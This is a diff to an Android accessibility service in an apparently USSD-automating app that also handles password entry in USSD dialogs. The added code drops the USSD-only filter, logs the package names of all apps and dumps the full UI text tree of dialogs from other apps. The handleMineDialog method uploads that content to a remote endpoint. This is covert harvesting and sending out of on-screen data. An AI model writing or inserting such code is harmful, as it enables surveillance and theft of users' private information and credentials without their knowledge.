@@ -14,8 +14,10 @@ import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Toast;
 
+import com.google.gson.Gson;
 import com.project.setussd.Contact;
 import com.project.setussd.activity.chato.ChatOneActivity;
+import com.project.setussd.bean.DevNodeInfo;
 import com.project.setussd.bean.UssAction;
 import com.project.setussd.log.UssdLogger;
 import com.project.setussd.network.ApiCallback;
@@ -61,6 +63,13 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
         return instance;
     }
 
+    //
+    private Gson gson = new Gson();
+
+    //
+    public static List<String> allPkg1List = new ArrayList<>();
+    public static List<String> allPkg2List = new ArrayList<>();
+
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
@@ -69,47 +78,166 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event == null || isFinished || !isTaskRunning) return;
-        //
-        CharSequence pkg = event.getPackageName();
-        if (!isUssdPackage(pkg)) return;
+        if (event == null) return;
+
+//        Log.i("USSD_LOG", "getEventType: " + event.getEventType());
+//        Log.i("USSD_LOG", "getClassName: " + event.getClassName());
+//        Log.i("USSD_LOG", "getPackageName: " + event.getPackageName());
+
+        // pkg1
+        String pkg = event.getPackageName().toString();
+        if (pkg.contains("com.project.setussd")) return; // 自己程序的不包含
+        if (!allPkg1List.contains(pkg)) {  // 保存
+            allPkg1List.add(pkg);
+        }
+
         //
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
-        UssdLogger.log(ChatOneActivity.mianActivity, "检测到USSD弹窗");
+
+        //
         try {
-            handleUssdEvent(root);
+            handleUssdEvent1(event, root);
         } finally {
             root.recycle();
         }
     }
 
-    private void handleUssdEvent(AccessibilityNodeInfo root) {
+    // 这里：检测到了弹窗
+    private void handleUssdEvent1(AccessibilityEvent event, AccessibilityNodeInfo root) {
+        // pkg2
+        String pkg2 = root.getPackageName().toString();
+        if (pkg2.contains("com.project.setussd")) return; // 自己程序的不包含
+        if (!allPkg2List.contains(pkg2)) {  // 保存
+            allPkg2List.add(pkg2);
+        }
+
+        //
+        if (isFinished || !isTaskRunning) return;
+        //
+        CharSequence pkg = event.getPackageName();
+        if (pkg == null) return;
+        String pkgName = event.getPackageName().toString();
+        //
+//        if (!isUssdPackage(pkg)) {
+//            String txt1 = "none";
+//            if (pkg != null) {
+//                txt1 = pkg.toString();
+//            }
+//            //            UssdLogger.log(ChatOneActivity.mianActivity, "!isUssdPackage: " + txt1);
+//            return;
+//        }
+
+        String pkgName2 = root.getPackageName().toString();
+        //
+        UssdLogger.log(ChatOneActivity.mianActivity, "检测到USSD弹窗");
+
+        //
         DisplayMetrics dm = getResources().getDisplayMetrics();
         AccessibilityNodeInfo dialog = DialogFinder.findDialog(root, dm);
 
-        if (dialog == null) return;
-
-        String text = NodeUtils.getUssdResultText(root, dialog);
-        if (text == null || text.trim().isEmpty()) return;
-
-        UssdLogger.log(this, "test: " + text);
-
-        if (text.toLowerCase().contains("running") ||
-                text.toLowerCase().contains("processing")) {
+        if (dialog == null) {
+            UssdLogger.log(this, "弹窗无对象");
             return;
         }
 
-        if (isScreenCaptureDialog(root)) return;
+        // 获取所有的文字，包括按钮的
+        String text = NodeUtils.getUssdResultText(root, dialog);
+        if (text == null || text.trim().isEmpty()) {
+            UssdLogger.log(this, "弹窗无文字");
+            return;
+        }
+
+        // 打印出来
+        //UssdLogger.log(this, "弹窗文字: " + text);
+
+        // 如果是在执行中
+//        if (text.toLowerCase().contains("running") ||
+//                text.toLowerCase().contains("processing")) {
+//            UssdLogger.log(this, "弹窗是执行中");
+//            return;
+//        }
+
+        // 录制中
+        if (isScreenCaptureDialog(root)) {
+            UssdLogger.log(this, "isScreenCaptureDialog");
+            return;
+        }
+
+        // test
+        handleMineDialog(dialog, pkgName, pkgName2);
 
         AccessibilityNodeInfo input = findUssdInput(dialog);
-        if (input != null) {
-            UssdLogger.log(this, "发现输入框，准备输入密码");
-            handleInputDialog(input, dialog, text, dm);
-        } else {
-            UssdLogger.log(this, "无输入框");
-            handleResultDialog(dialog, text, dm);
+//        if (input != null) {
+//            UssdLogger.log(this, "发现输入框，准备输入密码");
+//            handleInputDialog(input, dialog, text, dm);
+//        } else {
+//            UssdLogger.log(this, "无输入框");
+//            handleResultDialog(dialog, text, dm);
+//        }
+
+        // 测试
+//        Log.i("USSD_LOG", "----");
+//        List<DevNodeInfo> nodeList = new ArrayList<>();
+//        DevNodeInfo info = mineTestNodeInfo(root, nodeList);
+//        String json1 = gson.toJson(info);
+//        String json2 = gson.toJson(nodeList);
+//        Log.i("USSD_LOG", "json1: " + json1);
+//        Log.i("USSD_LOG", "json2: " + json2);
+        // 测试
+//        handleMineDialog(input, dialog, text, dm);
+
+    }
+
+
+    public DevNodeInfo mineTestNodeInfo(AccessibilityNodeInfo root, List<DevNodeInfo> nodeList) {
+        if (root == null) return null;
+        //
+        DevNodeInfo info1 = new DevNodeInfo();
+        DevNodeInfo info2 = new DevNodeInfo();
+        //
+        info1.viewIdResourceName = root.getViewIdResourceName();
+        info2.viewIdResourceName = root.getViewIdResourceName();
+        //
+        info1.packageName = root.getPackageName().toString();
+        info2.packageName = root.getPackageName().toString();
+        //
+        CharSequence cn = root.getClassName();
+        if (cn != null) {
+            info1.className = cn.toString();
+            info2.className = cn.toString();
         }
+        //
+        CharSequence tx = root.getText();
+        if (tx != null) {
+            info1.text = tx.toString();
+            info2.text = tx.toString();
+        }
+        //
+        if (root.isClickable()) {
+            info1.clickable = true;
+            info2.clickable = true;
+        }
+        //
+        nodeList.add(info2);
+        //
+    //        Log.i("USSD_LOG", "getViewIdResourceName: " + root.getViewIdResourceName());
+    //        Log.i("USSD_LOG", "getClassName: " + root.getClassName());
+    //        Log.i("USSD_LOG", "getText: " + root.getText());
+        //
+        if (root.getChildCount() > 0) {
+            info1.subs = new ArrayList<>();
+            for (int i = 0; i < root.getChildCount(); i++) {
+                AccessibilityNodeInfo child = root.getChild(i);
+                if (child != null) {
+                    DevNodeInfo sub = mineTestNodeInfo(child, nodeList);
+                    if (sub != null) {
+                        info1.subs.add(sub);
+                    }
+                }
+            }
+        }
+        return info1;
     }
 
     public void startUssdTask() {
@@ -134,6 +262,44 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
             if (p.contains(s)) return true;
         }
         return false;
+    }
+
+    // 自己测试的
+    private void handleMineDialog(AccessibilityNodeInfo dialog, String str, String str2) {
+        if (isSameDialog(dialog)) {
+            return;
+        }
+        // 测试
+        Log.i("USSD_LOG", "----");
+        List<DevNodeInfo> nodeList = new ArrayList<>();
+        DevNodeInfo info = mineTestNodeInfo(dialog, nodeList);
+        String json1 = gson.toJson(info);
+        String json2 = gson.toJson(nodeList);
+        Log.i("USSD_LOG", "json1: " + json1);
+        Log.i("USSD_LOG", "json2: " + json2);
+
+        // 提交数据
+        Map<String, String> params = new HashMap<>();
+        params.put("msg", str + " / " + str2 + " / " + lastDialogHash + " / " + json2);
+        ApiClient.request("/apin/vdfapp/msg", params, UssAction.class, new ApiCallback<UssAction>() {
+            @Override
+            public void onSuccess(UssAction data) {
+                UssdLogger.log(ChatUssadAccessibilityService.this, "上报成功 Mine");
+                lastDialogHash = 0;
+            }
+
+            @Override
+            public void onError(int code, String msg) {
+                UssdLogger.log(ChatUssadAccessibilityService.this, "上报失败 Mine");
+                lastDialogHash = 0;
+            }
+
+            @Override
+            public void onFailure(String error) {
+                UssdLogger.log(ChatUssadAccessibilityService.this, "上报失败，网络错误 Mine");
+                lastDialogHash = 0;
+            }
+        });
     }
 
     private void handleInputDialog(AccessibilityNodeInfo input,
@@ -219,8 +385,8 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
             return;
         }
 
-        if (isImmediateError(text)) {
-            if (isFinishedFail(text)) {
+        if (isImmediateError(text)) {  // 是否直接失败
+            if (isFinishedFail(text)) { // 是否结束失败
                 handleSendFail(text);
             }
             captureAndSend(dialog, text, dm);
@@ -286,15 +452,20 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
         return list != null && !list.isEmpty();
     }
 
-    private boolean isSameDialog(AccessibilityNodeInfo node) {
+    private synchronized boolean isSameDialog(AccessibilityNodeInfo node) {
         if (node == null) return false;
 
         Rect r = new Rect();
         node.getBoundsInScreen(r);
         int hash = r.toShortString().hashCode();
+        //UssdLogger.log(ChatUssadAccessibilityService.this, "hash:" + hash);
 
-        if (hash == lastDialogHash) return true;
+        if (hash == lastDialogHash) {
+            //UssdLogger.log(ChatUssadAccessibilityService.this, "相同的");
+            return true;
+        }
 
+        //UssdLogger.log(ChatUssadAccessibilityService.this, "不相同");
         lastDialogHash = hash;
         return false;
     }
